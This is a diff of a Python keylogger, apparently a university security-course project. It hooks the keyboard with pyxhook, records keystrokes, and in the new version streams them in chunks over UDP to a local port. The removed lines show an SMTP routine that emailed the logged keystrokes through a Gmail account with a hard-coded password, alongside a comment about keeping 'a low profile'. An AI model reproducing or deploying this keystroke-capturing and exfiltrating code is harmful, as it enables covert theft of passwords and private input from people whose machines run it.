@@ -14,14 +14,13 @@ security principles and demonstrate mastery of secure programming techniques.
 import pyxhook
 import time
 import threading
-import smtplib
 import socket
 
 running = True
 string = ""
 
 # Email Logs
-class TimerClass(threading.Thread):
+class DataThread(threading.Thread):
 
     def __init__(self):
         threading.Thread.__init__(self)
@@ -29,58 +28,29 @@ class TimerClass(threading.Thread):
 
     def run(self):
         global running
+        global string
 
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        hostname = socket.gethostname()
+        hostname = 'localhost'
         port = 35476
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         connection = (hostname, port)
 
         while running:
             try:
-                s.connect(connection)
-                print("connection established")
-                break
+                if len(string) < 1024:
+                    pass
+                else:
+                    data = string[0:1023]
+                    string = string[1024:]
+                    s.sendto( data, connection )
             except:
                 pass
 
+        s.sendto(string, connection)
+        s.sendto("done", connection)
         s.close()
 
-        """
-        while not self.event.is_set() and running is False:
-            with open("test.txt", 'r') as datafile:
-                data = datafile.read()
-
-                # Initialize mail server for data transport
-                SERVER = "smtp.gmail.com"
-                PORT = 587
-                USER= "ritfakelogger@gmail.com"
-                PASS= "fakekeylogg"
-                FROM = USER
-                TO = ["dxt9140@g.rit.edu"]
-                SUBJECT = "Keylogger Data"
-                MESSAGE = data
-         
-                try:
-                    # Connect to the server and send the message
-                    server = smtplib.SMTP()
-                    server.connect(SERVER,PORT)
-                    server.starttls()
-                    server.login(USER,PASS)
-                    server.sendmail(FROM, TO, SUBJECT, MESSAGE)
-                    server.quit()
-                    with open("test.txt", 'w') as clear_file:
-                        clear_file.write("")
-    
-                I don't think we should print things to the console. We want
-                a low profile. Remove?
-
-                @Todo
-                except Exception as e:
-                    print(e)
-
-            # Why wait?
-            self.event.wait(1)
-        """
 
     def cancel(self):
         self.event.set()
@@ -88,7 +58,6 @@ class TimerClass(threading.Thread):
 def keyDownEvent( event ):
     global running
     global string
-    global test_file
 
     if event.Ascii == 8:
         string += "<bs>"
@@ -97,43 +66,32 @@ def keyDownEvent( event ):
     elif event.Ascii >= 32:
         string += chr(event.Ascii)
 
-    # Esc ends the program
-    if event.Ascii == 27:
-        test_file.write(string)
+    # Esc or ctrl-c ends the program
+    elif event.Ascii == 27 or event.Ascii == 3:
         running = False
 
 
 def main():
     global running
-    global test_file
 
-    # Clear the data file. Can be removed later once I actually want to
-    # receive emails.
-    test_file = open("test.txt", "a")
-
-    # Create PyxHook object
+    # Create some thread objects
     keyboard_hook = pyxhook.HookManager()
+    sender = DataThread()
 
-    # keyDownEvent function is called when keydown is detected
+    # Keyboard hook initialization
     keyboard_hook.KeyDown = keyDownEvent
-
-    # hook the keyboard to listen
     keyboard_hook.HookKeyboard()
 
-    # Begin the keyboard hook thread
+    # Start the other threads
     keyboard_hook.start()
-
-    # Create the thread that will send the data when the server connects
-    sender = TimerClass()
     sender.start()
 
     while running:
-        time.sleep(.01)
+        time.sleep(.1)
 
     # close thread
     sender.cancel()
     keyboard_hook.cancel()
-    test_file.close()
 
 if __name__ == '__main__':
     main()
